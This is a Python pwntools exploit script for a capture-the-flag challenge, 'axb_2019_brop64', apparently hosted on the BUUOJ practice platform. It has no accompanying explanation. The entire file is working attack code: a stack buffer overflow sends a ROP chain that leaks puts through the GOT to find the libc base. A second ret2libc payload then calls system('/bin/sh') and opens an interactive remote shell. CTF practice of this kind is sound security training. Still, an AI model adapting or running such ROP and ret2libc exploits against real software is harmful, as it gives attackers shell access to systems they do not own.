from pwn import *

#context.log_level = 'debug'

p = remote('node4.buuoj.cn', 27852)
#p = process('./axb_2019_brop64')
elf = ELF('axb_2019_brop64')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.buu.so')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi_ret = 0x400963
repeater = elf.sym['repeater']

payload = b'a' * ( 0xd0 + 8 ) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(repeater)

p.sendlineafter(b'Please tell me:', payload)

puts_real_addr = u64(p.recvuntil(b'\n')[-7:-1].ljust(8, b'\0'))
libc_base = puts_real_addr - libc.sym['puts']
print('[+] libc_base -> {}'.format(hex(libc_base)))

system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

payload = b'a' * ( 0xd0 + 8 ) + p64(pop_rdi_ret) + p64(bin_sh) + p64(pop_rdi_ret + 1) + p64(system)

p.sendlineafter(b'Please tell me:', payload)
p.recvuntil(b'ac')

p.interactive()